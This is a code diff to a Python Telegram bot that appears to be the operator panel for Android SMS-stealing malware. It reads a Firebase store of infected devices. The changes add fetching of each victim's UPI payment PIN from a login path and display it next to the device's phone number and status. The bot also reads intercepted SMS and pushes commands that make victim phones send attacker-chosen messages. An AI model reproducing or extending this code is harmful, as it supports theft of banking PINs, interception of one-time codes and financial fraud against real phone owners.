@@ -109,7 +109,6 @@ async def show_device_page(update, context, page):
         return
     
     try:
-        # UPDATED PATH: user_data
         response = requests.get(f"{firebase_base}/user_data.json")
         clients = response.json() or {}
         if not clients:
@@ -126,12 +125,14 @@ async def show_device_page(update, context, page):
         keyboard = []
         msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            # Safely fetch details
+            # Fetch Pin from external path
+            pin_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}/pin.json")
+            pin = pin_resp.json() if pin_resp.status_code == 200 else "N/A"
+            
             name = info.get('d_name', 'Unknown')
             status_icon = "🟢" if info.get('status') == "online" else "🔴"
             phone = info.get('phoneNumber', 'N/A')
             battery = info.get('battery', 'N/A')
-            pin = info.get('upi_pin', 'N/A')
             msg += f"{status_icon} {name}\n🆔 {client_id}\n📞 {phone}\n🔋 {battery}%\n📌 UPI Pin: {pin}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])
 
@@ -160,15 +161,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
-            # UPDATED PATH: user_data
             response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
             details = response.json() or {}
+            
+            # Fetch Pin from external path
+            pin_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}/pin.json")
+            pin = pin_resp.json() if pin_resp.status_code == 200 else "N/A"
+            
             status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
             msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
                    f"🆔 {client_id}\n"
                    f"📞 {details.get('phoneNumber', 'Unknown')}\n"
                    f"🔋 {details.get('battery', 'N/A')}%\n"
-                   f"📌 UPI Pin: {details.get('upi_pin', 'N/A')}\n"
+                   f"📌 UPI Pin: {pin}\n"
                    f"{status}\n\n"
                    f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
             await query.edit_message_text(text=msg)
@@ -192,7 +197,6 @@ async def monitor_task(chat_id, context):
     last_msg_key = None
 
     try:
-        # UPDATED PATH: user_data
         sms_data = requests.get(f"{firebase_base}/user_data/{selected_device_id}/sms.json").json()
         if sms_data and isinstance(sms_data, dict):
             last_sms_key = list(sms_data.keys())[-1]
@@ -252,7 +256,6 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if target_number and token:
                 payload = {"from": 0, "to": target_number, "message": token, "isSended": False}
-                # UPDATED PATH: user_data
                 push_url = f"{firebase_base}/user_data/{selected_device_id}/webhookEvent/sendSms.json"
                 response = requests.put(push_url, json=payload)
                 if response.status_code == 200:
@@ -277,4 +280,4 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
     app.run_polling()
-        
+    
